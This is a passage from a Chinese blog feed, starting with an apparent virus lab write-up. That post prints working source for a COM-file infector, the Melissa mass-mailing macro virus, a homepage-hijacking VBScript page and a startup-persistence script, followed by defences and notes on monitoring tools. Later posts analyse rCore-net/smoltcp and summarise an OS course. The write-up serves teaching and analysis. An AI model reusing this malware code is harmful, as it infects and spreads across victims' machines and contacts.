SI,OFFSET yuan4byte-OFFSET vstart #取得原程序前四个字节MOV DI,100h #目的地址MOV AX,DS:[SI] #开始复制MOV DS:[DI],AXINC SIINC SIINC DIINC DIMOV AX,DS:[SI]MOV DS:[DI],AXMOV SI,BP #恢复地址值MOV DX,OFFSET delname-OFFSET vstart #得到删除文件名ADD DX,SIMOV AH,41hINT 21hMOV DX,OFFSET filename-OFFSET vstart#得到要感染文件名ADD DX,SIMOV AL,02MOV AH,3dhF#写文件INT 21hJC errorMOV BX,AX#文件句柄MOV DX,OFFSET yuan4byte-OFFSET vstart#读文件前四个字节ADD DX,SIMOV CX,4MOV AH,3fhINT 21hMOV AX,4202h#到文件尾XOR CX,CXXOR DX,DXINT 21hMOV DI,OFFSET new4byte-OFFSET vstart#保存要跳的地方ADD DI,2ADD DI,SISUB AX,4MOV DS:[DI],AXADD SI,OFFSET mainstart-OFFSET vstart#准备写入病毒MOV DX,SIMOV vsizes,OFFSET vends-OFFSET mainstartMOV CX,vsizesMOV AH,40hINT 21hMOV SI,BP#定位到文件头MOV AL,0XOR CX,CXXOR DX,DXMOV AH,42hINT 21hMOV AH,40h#将新的文件头写入MOV CX,4MOV DX,OFFSET new4byte-OFFSET vstartADD DX,SIINT 21hMOV AH,3eh#关闭文件INT 21herror:MOV AX,100hPUSH AXRETmain ENDPyuan4byte:RET ; ??DB 3 DUP (?)vsizes DW 0new4byte DB &#39;M&#39;,0e9h,0,0filename DB &quot;test.com&quot;,0delname DB &quot;del.txt&quot;,0message DB &quot;You are infected by a simple com virus~~&quot;DB 0dh,0ah,&quot;$&quot;vends:start:MOV AX,CSEGMOV DS,AXMOV SS,AXCALL mainMOV AX,4c00hINT 21hCSEG ENDSEND start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析的有趣的点</p><ol><li><p> DOS下com文件的加载时一对一的映射的，没有PE结构那样的MZ头和PE头</p></li><li><p> COM文件加载代码的基址是100H，0~100H是PSP结构，COM文件只有一个段，所以DS，ES……段寄存器都指向PSP</p></li><li><p> COM文件没有堆栈段，用debug调试发现，sp：FFFE，bp：0000，bp寄存器经过测试可以用来存储其他的值对运行没有影响</p></li><li><p> 病毒代码使用call pop组合拿到pop处代码的绝对地址，以实现重定位</p></li><li><p>通过对被感染文件的前4字节填充为 sub bp， jmp<br> shellcode实现shellcode跳转，进入shellcode首先恢复前4字节，然后执行完流程后通过push<br> 100H,ret返回原程序</p></li><li><p> 在这里M除了躲避杀毒软件的查杀我没想到其他作用，删掉不影响运行（但是首地址的jmp的目标地址需要对应的修改）</p></li><li><p> yuan4byte中ret的作用：让病毒程序返回Main函数，成功运行完整个流程</p></li><li><p>为什么要SUB<br> AX,4：类似于inline-hook，jmp相对地址，需要减去jmp语句所在的偏移地址再-jmp本身的长度</p></li></ol><h2 id="梅丽莎病毒实验"><a href="#梅丽莎病毒实验" class="headerlink" title="梅丽莎病毒实验"></a>梅丽莎病毒实验</h2><p>代码</p><pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Sub autoOpen()On Error Resume Next&#39;*修改注册表，循环发送邮件程序部分If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &lt;&gt; &quot;&quot; Then &#39;注册表项判断CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False&#39;宏工具栏安全选项失效System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &#x3D; 1&amp;ElseCommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False&#39;工具菜单栏宏选项失效Options.ConfirmConversions &#x3D; (1-1): &#39;文件转换对话框不显示Options.VirusProtection &#x3D; (1-1): &#39;宏警告对话框不显示Options.SaveNormalPrompt &#x3D; (1-1) &#39;Normal.dot被修改后不显示对话框End IfDim UngaDasOutlook, DasMapiName, BreakUmOffASliceSet UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)&#39;创建outlook应用程序实例对象Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)&#39;获取MAPI对象If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;, &quot;Melissa&quot;)&lt;&gt; &quot;... by Kwyjibo&quot; ThenIf UngaDasOutlook &#x3D; &quot;Outlook&quot; ThenDasMapiName.Logon &quot;profile&quot;, &quot;password&quot;For y &#x3D; 1 To DasMapiName.AddressLists.Count&#39;遍历地址簿，进行邮件发送操作Set AddyBook &#x3D; DasMapiName.AddressLists(y)x &#x3D; 1Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)For oo &#x3D; 1 To AddyBook.AddressEntries.CountPeep &#x3D; AddyBook.AddressEntries(x)&#39;获取第 x 个收件人的收件地址BreakUmOffASlice.Recipients.Add Peep&#39;加入收件人的地址x &#x3D; x + 1If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.CountNext ooBreakUmOffASlice.Subject&#x3D; &quot;Important Message From &quot; &amp;Application.UserName &#39;设置邮件的主题BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ...don&#39;t show anyone else ;-)&quot; &#39;设置邮件的内容BreakUmOffASlice.Attachments.Add ActiveDocument.FullName &#39;加入附件BreakUmOffASlice.Send &#39;发送邮件Peep &#x3D; &quot;&quot;Next yDasMapiName.Logoff &#39;断开连接End IfSystem.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;,&quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot; &#39; 设置感染标志End If&#39;*FirstPartSet ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)&#39;获取当前文档VBA工程第一个模块的名称Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)&#39;获取Normal.dot VBA工程第一个模块的名称NTCL &#x3D; NTI1.CodeModule.CountOfLinesADCL &#x3D; ADI1.CodeModule.CountOfLinesBGN &#x3D; 2If ADI1.Name &lt;&gt; &quot;Melissa&quot; Then &#39;如果当前文档为感染If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCLSet ToInfect &#x3D; ADI1ADI1.Name &#x3D; &quot;Melissa&quot;DoAD &#x3D; TrueEnd IfIf NTI1.Name &lt;&gt; &quot;Melissa&quot; Then&#39;如果 Normal.dot 未感染If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCLSet ToInfect &#x3D; NTI1NTI1.Name &#x3D; &quot;Melissa&quot; &#39;修改VBA工程第一个模块为 MellisaDoNT &#x3D; TrueEnd IfIf DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA&#39;开始感染 Normal.dotIf DoNT &#x3D; True ThenDo While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;ADI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfIf DoAD &#x3D; True Then &#39;开始感染当前文档Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;NTI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfCYA:&#39;保存被修改的当前文档和Normal.dotIf NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name,&quot;Document&quot;) &#x3D; False) ThenActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullNameElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) ThenActiveDocument.Saved &#x3D; TrueEnd If&#39;WORD&#x2F;Melissa written by Kwyjibo&#39;Works in both Word 2000 and Word 97&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!If Day(Now) &#x3D; Minute(Now) ThenSelection.TypeText &quot; Twenty-two points, plus triple-word-score, plusfifty points for using all my letters. Game&#39;s over. I&#39;m outtahere.&quot;End Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p> 修改注册表</p></li><li><p> 发送邮件</p></li></ol><h2 id="HTML病毒"><a href="#HTML病毒" class="headerlink" title="HTML病毒"></a>HTML病毒</h2><h4 id="无限跳窗口病毒"><a href="#无限跳窗口病毒" class="headerlink" title="无限跳窗口病毒"></a>无限跳窗口病毒</h4> <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span><span class="token string">""</span> onmouseover<span class="token operator">=</span><span class="token string">"while(true)&#123;window.open()&#125;"</span><span class="token operator">></span>恶意弹出窗口！<span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将此病毒运行在现实中的 chrome 浏览器上，系统提示<br>阻止弹出窗口，表明现行的浏览器已经对这种病毒进行了防护</p><h4 id="更改主页病毒"><a href="#更改主页病毒" class="headerlink" title="更改主页病毒"></a>更改主页病毒</h4><p>通过 VbScript 嵌入 html 的 script 标签， 嵌入一段vb代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>Content-Type</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html:charset=gb2312<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HEAD</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vbscript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">Sub <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Dim TheFormSet TheForm<span class="token operator">=</span>Document<span class="token punctuation">.</span>forms（<span class="token string">"myform"</span>）strKey<span class="token operator">=</span><span class="token string">"HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain"</span>strValue<span class="token operator">=</span><span class="token string">"Start Page"</span>strData<span class="token operator">=</span><span class="token string">"http://www.simpleware.com.cn"</span>strType <span class="token operator">=</span><span class="token string">"REG_SZ"</span>regAdd strKey，strValue，strData，strTypeEnd Sub<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>上方 main script主体，调用regAdd 函数 进行注册表项的更改<span class="token operator">--</span><span class="token operator">></span><span class="token keyword">function</span> regAdd（strKey，strValue，strData，strType）Dim WshshellSet WshShell<span class="token operator">=</span>CreateObject（<span class="token string">"WScript.Shell"</span>）WshShell<span class="token punctuation">.</span>RegWrite strKey <span class="token operator">&amp;</span> <span class="token string">""</span> <span class="token operator">&amp;</span> strValue<span class="token punctuation">,</span>strData<span class="token punctuation">,</span>strType<span class="token operator">&lt;</span><span class="token operator">!</span>通过 shell 文件进行注册表项的改写<span class="token operator">></span>msgbox（<span class="token string">"Successful"</span>）<span class="token operator">&lt;</span><span class="token operator">!</span>改写成功后 显示 successful<span class="token operator">></span>end <span class="token keyword">function</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HEAD</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>修改主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image22.jpeg" class="" width="22"><p>注册表修改成功</p><p>五、防治方法：<br>5.1要避免被网页恶意代码感染，首先关键是不要轻易去一些并不信任的站点。<br>5.2IE点击”工具–&gt;Internet选项–&gt;安全–&gt;Internet区域的安全级别”，把安全级别由”中”改为”高”。<br>5.3具体方案是：在IE窗口中点击”工具—&gt;Internet选项”，在弹出的对话框中选择”安全”标签，再点击”自定义级别”按钮，就会弹出”安全设置”对话框，把其中所有Acti<br>veX插件和控件以及与Java相关全部选项选择”禁用”。<br>5.4一定要在计算机上安装防火墙，并要时刻打开”实时监控功能”。<br>5.5在注册表的KEY<em>CURRENT</em>USERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystem下，增加名为DisableRegistryTools的DWORD值项，将其值改为”1”，即可禁止使用注册表编辑器命令regedit.exe。<br>5.6因为特殊原因需要修改注册表，可应用如下解锁方法：开始因为特殊原因需要修改注册表，可应用如下解锁方法：运行—&gt;gpedit.msc打开组策略左面分级展开用户配置—&gt;管理模板—–&gt;系统右面有个阻止访问注册表编辑工具设置成已禁用确定即可。<br>5.7随时升级IE浏览器的补丁。<br>【实验思考】<br>1.可根据”几个相关修改”中提到的注册表中值，利用”更改主页”中修改注册表的方法，来进行自己的注册表修改，并给出如何防范和修复。</p><h2 id="脚本病毒"><a href="#脚本病毒" class="headerlink" title="脚本病毒"></a>脚本病毒</h2><p>自动拷贝到开始菜单启动栏项</p><blockquote><p>On Error Resume Next’启动或关闭一个错误处理常式</p><p>Set<br>fs=CreateObject(“Scripting.FileSystemobject”)’创建并返回一个对Activex对象的引用</p><p>Set diro=fs.GetSpecialFolder(0)’取系统路径C:windows</p><p>dirl=Mid(dir0,1,InStr(dir0,”:”))’取系统盘符</p><p>Set so=CreateObject（”Scripting.FileSystemObject”）</p><p>dim r’定义变量</p><p>Set r=Create0bject(“Wscript.Shel1”)’创建并返回一个对<br>Activex对象的引用</p><p>so.GetFile(WScript.ScriptFullName).Copy(dirl&amp;”Documents and<br>SettingsAdministrator[开始]菜单程序启动Win32system.vbs”)</p><p>‘拷贝文件</p></blockquote><h2 id="病毒分析-1"><a href="#病毒分析-1" class="headerlink" title="病毒分析"></a>病毒分析</h2><p>文件监控</p><p>学会了Process Monitor 的使用，这个软件现在仍然活跃在今日的舞台</p><p>1.8注意，不要把explorer.exe和iexplore.exe这两个进程过滤掉，因为病毒经常要注入代码到这两个进程中完成特别的功能。如果过滤掉这两个进程，那么就无法监控到被注入到这两个进程的代码所进行的文件操作。</p><p>注册表监控 ： 根据 operation 过滤项，查看 RegSetValue<br>即更改了注册表项的进程</p><p>进程监控二 ： 学会使用 Process Explorer</p><p>网络监控：利用 TcpView 工具进行 端口，进程的网络连接监控，netspy<br>进行侵入并打开7306端口等待 netmonitor 的监控，可以查看计算机中的文件</p><p>全面监控： 利用 InCtrl5 对安装程序的安装过程进行文件，注册表项，INI，TXT<br>文件的全面跟踪，从而实现对安装过程的全面了解，并生成一份报告，供查阅</p><h1 id="致-谢"><a href="#致-谢" class="headerlink" title="致 谢"></a>致 谢</h1><p>感谢老师 和 学长的帮助和指导</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore-net 及 smoltcp 分析</title>
      <link href="/2020/09/30/Analysis%20of%20rCore-Net/"/>
      <url>/2020/09/30/Analysis%20of%20rCore-Net/</url>
      
        <content type="html"><![CDATA[<p>本文是 <code>rCore-Net</code> 项目前对于 rCore-net 和 smoltcp 的分析</p><a id="more"></a><h1 id="rCore-Net-分析"><a href="#rCore-Net-分析" class="headerlink" title="rCore-Net 分析"></a>rCore-Net 分析</h1><p>rCore-Net 主要借用 smoltcp 的crate ，主要完成了，TCP，UDP，RAW，PACKET（作为以太网出口），Netlink 等结构和相关功能。</p><h2 id="总体结构："><a href="#总体结构：" class="headerlink" title="总体结构："></a>总体结构：</h2><p><strong>SOCKETS</strong> ：smoltcp是单线程的网络协议栈，定义一个全局的互斥锁，以保证操作的互斥性</p><h3 id="四种-SocketState"><a href="#四种-SocketState" class="headerlink" title="四种 SocketState"></a>四种 SocketState</h3><p>TCP：利用TCP协议的方式，</p><p>UDP：利用UDp协议的方式</p><p>Raw：可用于接受其他协议的数据</p><p>Packet：没有状态，只用于以太网出口</p><p>Netlink：基于socket的通信机制实现的内核空间和用户空间的销量数据的及时交互</p><h3 id="SocketState-的-imp-函数们"><a href="#SocketState-的-imp-函数们" class="headerlink" title="SocketState 的 imp 函数们"></a>SocketState 的 imp 函数们</h3><p>read ： 从 buffer 中取出尽可能多的数据，放到一个 u8数组，（data） 中</p><p>write ： </p><ul><li>Tcp 发送到连接的远程 endpoint  </li><li>Udp 发送到参数指定的远程 endpoint  </li><li>Raw 如果头部包含在考虑范围则可以直接发送，否则自己组一个 ip packet包，发送到指定远程 endpoint(通过将远程地址填入头部 destination处)</li></ul><p>poll ： 检查socket状态 ， 返回（是否正常，是否能接收，是否能发送）</p><p>connect ： 与远程 endpoint 连接 ，通过设置remote_endpoint, Tcp需要分配一个临时的 port 。</p><p>bind ： 将 socket 绑定一个本地的 ip</p><p>listen ： 如果没有listen对应的端口，就开启listen，否则不操作</p><p>shutdown : 关闭socket</p><p>accept ： Tcp 从连接事件队列中取出一个时间，建立新的socket 并替换当前的socket</p><p>local_endpoint  : 返回本地ip</p><p>remote_endpoint : 返回远程 ip</p><p>box_clone :  clone一个自身对象</p><p><strong>ioctl ： TODO</strong></p><h2 id="函数的普遍过程"><a href="#函数的普遍过程" class="headerlink" title="函数的普遍过程"></a>函数的普遍过程</h2><p>普遍函数调用过程 ，获取 SOCKETS 的互斥锁， 并获取他的句柄，转类型为 TcpSocket 或 UcpSocket</p><p>进行对 socket 的操作，然后及时将锁和句柄drop 掉</p><p><strong>TODO</strong>： ioctl 和 ArpSeq 的部分 可能还需要再研究一下</p><h1 id="Smoltcp-分析"><a href="#Smoltcp-分析" class="headerlink" title="Smoltcp 分析"></a>Smoltcp 分析</h1><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>Tcp State :   [enum] 由 rfc 793 规定的 11 种状态</p><img src="https://github.com/yunwei37/rCore-net/blob/master/docs/dingiso/imgs/TCP%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2.png" alt="TCP状态转换图" /><h3 id="Timer"><a href="#Timer" class="headerlink" title="Timer :"></a>Timer :</h3><ul><li>[enum]  由timer 触发的重传，快速重传等行为</li><li>set_for_idle()   设定活跃时间为 当前时间戳 timestamp + 设定的时间间隔 interval</li><li>should_keep_alive()   判断当前时间戳是否 &gt;= 活跃时间 </li><li>should_retransmit() <ul><li>时间戳大于重传期限则重传，返回 超时时间+延迟  </li><li>快速重传 返回 0</li></ul></li><li>set_keep_alive() 初始化 活跃时间为 0</li><li>should_close() 时间戳大于关闭期限 返回 true</li><li>poll_at 返回 socket 下一次被 poll 的时间</li></ul><h3 id="TcpSocket"><a href="#TcpSocket" class="headerlink" title="TcpSocket"></a>TcpSocket</h3><ul><li>struct 主要包括一下内容<ul><li>两个buffer 存储 接受的内容和要发送的内容</li><li>state  ：保存socket 的状态</li><li>timer ：用于计时</li><li>assembler ：缓冲区的 重新组装</li><li>addr 及 endpoint : 本地ip及接口和 远程的 ip 及 接口</li><li>seq_no  : Tcp中的 sequence number</li><li>ack ： ack码</li><li>win ： Tcp 的发送窗口相关内容</li></ul></li><li>listen  :  开始监听本机相应端口，open会返回 illegal ， 端口为0 则返回 unaddressable</li><li>connect :  跟远程endpoint连接，端口期望给出，否则分配一个 49152-65535 端口</li><li>close ：关闭全双工连接的传输部分</li></ul><h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><ul><li>TcpSocketState的 write函数， 第二个参数  <code>_send_to_endpoint</code> 并没有使用， 提了 issue <a href="https://github.com/rcore-os/rCore/issues/69">[Bug Report] wrong of fn write in the TcpSocketState</a>  </li></ul><p>好吧，我傻了，此参数只是用来填充以保证 trait 的实现的。（菜）</p><ul><li>smoltcp -  storage/ring_buffer.rs  255行 dequeue_slice 函数为什么计算两次size</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> rCore </tag>
            
            <tag> os </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统期末总结</title>
      <link href="/2020/08/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本文是对操作系统的课程的期末总结的文档-帮助自己了解整体的结构<br><code>reference</code>：mooc 上南京大学 骆斌 老师的PPT</p><a id="more"></a><h1 id="操作系统-期末总结"><a href="#操作系统-期末总结" class="headerlink" title="操作系统 期末总结"></a>操作系统 期末总结</h1><h4 id="过程-—-算法"><a href="#过程-—-算法" class="headerlink" title="过程  —- 算法"></a>过程  —- 算法</h4><p>设备涉及数据机构：设备控制表DCT ；控制器控制表COCT；通道控制表CHCT；系统设备表SDT</p><p>作业 - 平日练习</p><p>计算机概述 ： 选择</p><p>处理器 ： 内核模式，用户模式，中断</p><p>处理器管理：进程，程序区别，为什么提出进程，进程状态转换，进程管理（创建）原子操作</p><p>线程： 为什么提出线程，线程和进程区别在哪里，用户级线程，内核级线程，多线程的混合实现（CPU调度）</p><p>存储：物理内存，（连续，离散），页式管理 寻址，段页区别，管理</p><p>设备：I/O子系统，缓冲区，SPooling，脱机 ，磁盘调度</p><p>文件：文件逻辑结构，物理结构，目录结构，目录管理，辅存空间</p><p>PV操作，霍尔管程</p><p>死锁</p><p>大题：</p><ul><li>PV操作，生产-消费同步 ， 读者写者问题，练习题（基础知识 掌握信号量）<ul><li>死锁避免，银行家算法，其他死锁检测算法，单资源 ，资源分配图</li></ul></li><li>段页式管理 工作原理，缺页替换算法</li><li>CPU调度算法</li><li>磁盘调度算法</li></ul><h3 id="并发程序设计"><a href="#并发程序设计" class="headerlink" title="并发程序设计"></a>并发程序设计</h3><p>程序执行的外部顺序性（多个程序执行有序） 和 内部顺序性（程序CPU执行有序）</p><p>临界区 - 程序段，多个进程停留在相关临界区则出现错误</p><p>临界区之多有一个进程，不能无限停留，不能无限等待进入</p><p>进临界区 关中断，出临界区 开中断</p><p>用户程序 ：信号量 PV原语，</p><p>semaphore ： 值为可几个进程进入临界区，具有等待进程队列 </p><p>p 操作 v操作 一一匹配</p><p>同步关系 决定 几个信号量</p><p>一生产一消费多缓冲 ： 两个信号量sput sget 一个k缓冲队列，两循环队列指针</p><p>多生产多消费： 多个进程共享 循环队列指针，对指针增加两个信号量</p><p>管程过程 互斥调用</p><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>四个必要条件： 互斥，占有和等待，不剥夺，循环等待</p><p>死锁的防止： </p><ul><li>破坏第一个条件：独占型资源 改造成 共享型资源</li><li>破坏三 ：剥夺式调度</li><li>破坏四：层次分配</li><li>预分配 ：</li></ul><p>死锁的避免：银行家算法</p><p>死锁的检测：Warshall传递闭包 ，检测后，重启或 检验点重启</p><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><p>文件物理结构 ：</p><ul><li>顺序文件：数组 - 快速存取 ｜预先分配空间，不易增删改</li><li>连接文件：链表 - 连接字（指针）为0结尾 ，易于增删改 ｜需要额外空间，仅顺序</li><li>直接文件：hash散列</li><li>索引文件：《key，value》-索引区，数据区 链表拓展 ｜需要查两次</li></ul><p>文件目录：</p><ul><li>一级，用户文件众多，容易重名，不利记忆</li><li>二级， 用户-文件目录。按用户 有用户权限</li><li>树形，可重名，有权限 路径名为根到结点</li></ul><p>文件查找：</p><ul><li>查找项：文件路径名 </li><li>查找法：顺序，二分，文件名变换成唯一值“杂凑法”</li><li>活动文件表： <ul><li>多目录访存，多次访问存储器开销大，将常用，正用复制进主存</li><li>保存文件目录信息而不是全部信息，能一步找到文件</li></ul></li></ul><p>文件的安全与保护</p><ul><li>共享（用户权限），保护（防破坏），保密（防窃取）</li><li>保密措施：隐蔽文件目录，设置口令，使用密码</li><li>保护措施：副本，存取表（存用户-属性），属性</li></ul><p>文件的存取</p><ul><li>顺序存取：读指针（可跳），写指针</li><li>直接存取：对记录进行操作，hash</li><li>索引存取：按键存取</li></ul><p>文件的使用</p><ul><li>两类接口： 操作文件整体，读写等对文件本身</li><li>建立文件：建立文件目录项-分配物理块-申请活动文件表-登记表-返回文件句柄</li><li>撤销文件：关闭文件-联访-删去目录项-释放空间</li><li>打开文件：申请活动文件表项-查找文件-复制到表项-共享文件处理-返回句柄</li><li>关闭文件：表项“用户数” -1</li><li>读写文件：找到 逻辑记录- 变为 物理快</li><li>定位文件：调整读写指针位置</li></ul><p>辅存空间管理</p><ul><li>连续分配：访问速度快，定时“碎片”整理“</li><li>非连续：空间管理效率高，便于文件动态增长，收缩</li><li>位示图：空闲块管理  - 高速分去配</li><li></li></ul><h2 id="IO设备"><a href="#IO设备" class="headerlink" title="IO设备"></a>IO设备</h2><p>操作系统  与 控制器 交互，而非与设备交互</p><p>IO控制方式</p><ul><li>轮询</li><li>中断 CPU负责发出I/O命令，响应中断 ｜控制器负责检查状态 就绪后发送中断</li><li>DMA 中断的活由DMA执行 CPU只在数据传送开始（初始化DMA）结束（响应中断，不必保护现场）参与<ul><li>周期窃取 - 